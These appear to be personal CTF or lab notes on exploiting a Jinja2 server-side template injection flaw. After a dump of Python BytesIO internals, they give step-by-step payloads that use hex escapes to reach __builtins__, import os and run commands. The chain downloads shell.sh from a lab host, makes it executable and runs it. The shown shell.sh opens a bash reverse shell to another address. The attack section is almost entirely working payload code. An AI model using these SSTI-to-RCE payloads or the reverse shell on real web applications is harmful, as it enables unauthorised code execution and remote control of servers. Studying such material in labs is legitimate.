{&#39;__iter__&#39;: &lt;slot wrapper &#39;__iter__&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;__next__&#39;: &lt;slot wrapper &#39;__next__&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;__init__&#39;: &lt;slot wrapper &#39;__init__&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;__new__&#39;: &lt;built-in method __new__ of type object at 0xa1d4a0&gt;, &#39;readable&#39;: &lt;method &#39;readable&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;seekable&#39;: &lt;method &#39;seekable&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;writable&#39;: &lt;method &#39;writable&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;close&#39;: &lt;method &#39;close&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;flush&#39;: &lt;method &#39;flush&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;isatty&#39;: &lt;method &#39;isatty&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;tell&#39;: &lt;method &#39;tell&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;write&#39;: &lt;method &#39;write&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;writelines&#39;: &lt;method &#39;writelines&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;read1&#39;: &lt;method &#39;read1&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;readinto&#39;: &lt;method &#39;readinto&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;readline&#39;: &lt;method &#39;readline&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;readlines&#39;: &lt;method &#39;readlines&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;read&#39;: &lt;method &#39;read&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;getbuffer&#39;: &lt;method &#39;getbuffer&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;getvalue&#39;: &lt;method &#39;getvalue&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;seek&#39;: &lt;method &#39;seek&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;truncate&#39;: &lt;method &#39;truncate&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;__getstate__&#39;: &lt;method &#39;__getstate__&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;__setstate__&#39;: &lt;method &#39;__setstate__&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;__sizeof__&#39;: &lt;method &#39;__sizeof__&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;closed&#39;: &lt;attribute &#39;closed&#39; of &#39;_io.BytesIO&#39; objects&gt;, &#39;__doc__&#39;: &#39;Buffered I/O implementation using an in-memory bytes buffer.&#39;}

{% set var1 = request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f") %} {% set var2 = var1["BytesIO"] %} # this was not the way to do it -> we can access more interesting things


{% set var1 = request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f") %} {% set var2 = var1["\x5f\x5fbuiltins\x5f\x5f"] %}
```


so calling things works i guess 

```jinja2
{% set var1 = request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f") %} {% set var2 = var1["\x5f\x5fbuiltins\x5f\x5f"] %} {% set os = var2["\x5f\x5fimport\x5f\x5f"]("os") %} {{os|attr("popen")("curl http://10.10.76.67:8000/shell.sh > shell.sh")|attr("read")()}}
```

with shell being 

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.36.14/6666 0>&1
```

```jinja2
{% set var1 = request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f") %} {% set var2 = var1["\x5f\x5fbuiltins\x5f\x5f"] %} {% set os = var2["\x5f\x5fimport\x5f\x5f"]("os") %} {{os|attr("popen")("chmod +x  shell.sh")|attr("read")()}}
```

```jinja2
{% set var1 = request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f") %} {% set var2 = var1["\x5f\x5fbuiltins\x5f\x5f"] %} {% set os = var2["\x5f\x5fimport\x5f\x5f"]("os") %} {{os|attr("popen")("./shell.sh")|attr("read")()}}
```

and thus we are now [[bill]]
## OTHER RECON

- cannot access forbidden places :(